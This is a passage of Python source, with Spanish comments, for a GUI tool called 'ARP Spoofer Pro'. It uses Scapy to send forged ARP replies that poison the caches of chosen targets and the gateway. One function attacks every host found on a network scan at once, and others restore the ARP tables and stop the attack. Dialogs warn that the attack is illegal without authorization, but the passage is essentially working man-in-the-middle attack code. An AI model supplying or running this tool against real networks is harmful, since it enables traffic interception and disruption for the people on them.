                        pdst=ip_objetivo,
                        hwdst=mac_objetivo,
                        psrc=self.ip_puerta_enlace,
                        hwsrc=self.mac_atacante
                    )
                    
                    # Envenenar caché del gateway (hacerse pasar por objetivo)
                    paquete_gateway = ARP(
                        op=2,
                        pdst=self.ip_puerta_enlace,
                        hwdst=mac_puerta,
                        psrc=ip_objetivo,
                        hwsrc=self.mac_atacante
                    )

                    send(paquete_objetivo, verbose=0)
                    send(paquete_gateway, verbose=0)
                    
                    contador += 2
                    self.estadisticas['paquetes_enviados'] += 2
                    
                    if contador % 10 == 0:  # Log cada 10 envíos para no saturar
                        self.log_message(f"📡 Paquetes enviados a {ip_objetivo}: {contador}", "info")
                    
                    time.sleep(2)
                    
                except PermissionError as pe:
                    self.log_message("⚠️ ERROR DE PERMISOS durante el envío de paquetes", "error")
                    self.log_message(f"Ejecuta: sudo python3 {os.path.abspath(__file__)}", "warning")
                    self.ataque_en_curso = False
                    messagebox.showerror(
                        "Error de Permisos",
                        "Se perdieron los permisos durante el ataque.\n\n"
                        f"Ejecuta en terminal:\nsudo python3 {os.path.abspath(__file__)}"
                    )
                    break
                    
        except Exception as e:
            self.log_message(f"❌ Error en spoofing de {ip_objetivo}: {str(e)}", "error")
        finally:
            self.restaurar_conexion(ip_objetivo, mac_objetivo)
            with self.lock:
                self.estadisticas['objetivos_activos'] -= 1

    def restaurar_conexion(self, ip_objetivo, mac_objetivo):
        """Restaura la tabla ARP del objetivo"""
        try:
            mac_puerta = self.obtener_mac(self.ip_puerta_enlace)
            
            if mac_objetivo and mac_puerta:
                # Restaurar tabla del objetivo
                paquete_objetivo = ARP(
                    op=2,
                    pdst=ip_objetivo,
                    hwdst=mac_objetivo,
                    psrc=self.ip_puerta_enlace,
                    hwsrc=mac_puerta
                )
                
                # Restaurar tabla del gateway
                paquete_gateway = ARP(
                    op=2,
                    pdst=self.ip_puerta_enlace,
                    hwdst=mac_puerta,
                    psrc=ip_objetivo,
                    hwsrc=mac_objetivo
                )

                send(paquete_objetivo, count=7, verbose=0)
                send(paquete_gateway, count=7, verbose=0)
                
                self.log_message(f"✓ Conexión restaurada para {ip_objetivo}", "success")
            else:
                self.log_message(f"❌ No se pudo restaurar {ip_objetivo}: MACs no disponibles", "error")
        except Exception as e:
            self.log_message(f"❌ Error restaurando {ip_objetivo}: {str(e)}", "error")

    def iniciar_spoofing(self):
        """Inicia el ataque ARP en todos los objetivos validados"""
        if not self.ips_validas:
            messagebox.showwarning("Advertencia", "Primero valida las IPs objetivo.")
            return

        confirmacion = messagebox.askyesno(
            "⚠️ Confirmar Ataque",
            f"¿Iniciar ARP Spoofing en {len(self.ips_validas)} objetivo(s)?\n\n"
            "ADVERTENCIA LEGAL:\n"
            "• Este ataque es ILEGAL sin autorización explícita\n"
            "• Solo debe usarse en entornos de prueba propios\n"
            "• Puede causar interrupciones en la red\n\n"
            "¿Deseas continuar?",
            icon='warning'
        )
        
        if not confirmacion:
            return

        self.ataque_en_curso = True
        self.estadisticas['tiempo_inicio'] = time.time()
        self.estadisticas['objetivos_activos'] = len(self.ips_validas)
        self.estadisticas['paquetes_enviados'] = 0
        
        self.boton_iniciar.config(state='disabled')
        self.boton_validar.config(state='disabled')
        self.boton_atacar_todos.config(state='disabled')
        self.boton_detener.config(state='normal')
        self.status_var.set(f"🔴 Ataque en curso - {len(self.ips_validas)} objetivos activos")
        
        self.log_message("="*80, "warning")
        self.log_message("⚡ INICIANDO ATAQUE ARP SPOOFING", "warning")
        self.log_message("="*80, "warning")
        
        self.threads_ataque.clear()
        
        for ip, mac in self.ips_validas.items():
            self.log_message(f"🎯 Objetivo: {ip} ({mac})", "warning")
            thread = threading.Thread(
                target=self.spoofing_arp,
                args=(ip, mac),
                daemon=True,
                name=f"Spoof-{ip}"
            )
            self.threads_ataque.append(thread)
            thread.start()

    def atacar_todos_hosts(self):
        """Ataca automáticamente todos los hosts encontrados en el escaneo"""
        if not self.hosts_escaneados:
            messagebox.showwarning(
                "Sin Hosts",
                "Primero debes escanear la red para encontrar hosts."
            )
            return
        
        confirmacion = messagebox.askyesno(
            "⚠️ CONFIRMACIÓN CRÍTICA",
            f"¿Estás seguro de atacar TODOS los {len(self.hosts_escaneados)} hosts detectados?\n\n"
            "Esto incluye:\n"
            "• Todos los dispositivos en la red\n"
            "• Posibles servidores críticos\n"
            "• Dispositivos de infraestructura\n\n"
            "ADVERTENCIA: Este ataque masivo es EXTREMADAMENTE peligroso\n"
            "y puede causar interrupciones severas en la red.\n\n"
            "¿CONTINUAR?",
            icon='warning'
        )
        
        if not confirmacion:
            return
        
        # Segunda confirmación
        confirmacion2 = messagebox.askyesno(
            "⚠️ ÚLTIMA ADVERTENCIA",
            "Esta es tu última oportunidad para cancelar.\n\n"
            "El ataque masivo comenzará en todos los hosts.\n\n"
            "¿DEFINITIVAMENTE deseas continuar?",
            icon='error'
        )
        
        if not confirmacion2:
            return
        
        # Preparar todos los hosts
        self.log_message("="*80, "warning")
        self.log_message("⚡ INICIANDO ATAQUE MASIVO A TODOS LOS HOSTS", "warning")
        self.log_message("="*80, "warning")
        
        self.ips_validas.clear()
        for ip, mac in self.hosts_escaneados:
            self.ips_validas[ip] = mac
            self.log_message(f"Objetivo agregado: {ip} -> {mac}", "info")
        
        # Iniciar ataque
        self.ataque_en_curso = True
        self.estadisticas['tiempo_inicio'] = time.time()
        self.estadisticas['objetivos_activos'] = len(self.ips_validas)
        self.estadisticas['paquetes_enviados'] = 0
        
        self.boton_iniciar.config(state='disabled')
        self.boton_validar.config(state='disabled')
        self.boton_atacar_todos.config(state='disabled')
        self.boton_detener.config(state='normal')
        self.status_var.set(f"🔴 ATAQUE MASIVO EN CURSO - {len(self.ips_validas)} objetivos")
        
        self.threads_ataque.clear()
        
        for ip, mac in self.ips_validas.items():
            thread = threading.Thread(
                target=self.spoofing_arp,
                args=(ip, mac),
                daemon=True,
                name=f"Spoof-{ip}"
            )
            self.threads_ataque.append(thread)
            thread.start()

    def detener_spoofing(self):
        """Detiene el ataque y restaura las conexiones"""
        self.log_message("="*80, "warning")
        self.log_message("⏹ Deteniendo ataque...", "warning")
        self.ataque_en_curso = False
        self.status_var.set("⏳ Deteniendo ataque y restaurando conexiones...")
        
        # Esperar a que los threads terminen
        for thread in self.threads_ataque:
            thread.join(timeout=5)
        
        self.log_message("✓ Ataque detenido correctamente", "success")
        self.log_message(f"📊 Total de paquetes enviados: {self.estadisticas['paquetes_enviados']}", "info")
        self.log_message("="*80, "success")
        
        self.boton_iniciar.config(state='normal')
        self.boton_validar.config(state='normal')
        if self.hosts_escaneados:
            self.boton_atacar_todos.config(state='normal')
        self.boton_detener.config(state='disabled')
        self.status_var.set("🟢 Estado: Detenido - Listo para nueva operación")
        self.threads_ataque.clear()
        
        # Resetear estadísticas
        self.estadisticas['tiempo_inicio'] = None
        self.estadisticas['objetivos_activos'] = 0

    def limpiar_log(self):
        """Limpia el registro de actividad"""
        self.widget_salida.delete(1.0, tk.END)
        self.log_message("🗑️ Log limpiado", "info")

    def _on_closing(self):
        """Maneja el cierre de la aplicación"""
        if self.ataque_en_curso:
            respuesta = messagebox.askyesnocancel(
                "⚠️ Ataque en Curso",
                "Hay un ataque ARP activo.\n\n"
                "¿Deseas detener el ataque antes de salir?\n\n"
                "• SÍ: Detener ataque y salir\n"
                "• NO: Salir sin detener (PELIGROSO)\n"
                "• CANCELAR: No salir"
            )
            if respuesta is None:  # Cancelar
                return
            elif respuesta:  # Sí, detener
                self.detener_spoofing()
                time.sleep(1)
        
        self.log_message("👋 Cerrando ARP Spoofer Pro...", "info")
        self.ventana.destroy()

    def run(self):
        """Ejecuta la aplicación"""
        self.ventana.mainloop()


if __name__ == "__main__":
    try:
        app = ARPSpoofer()
        app.run()
    except KeyboardInterrupt:
        print("\n[!] Programa interrumpido por el usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error fatal: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)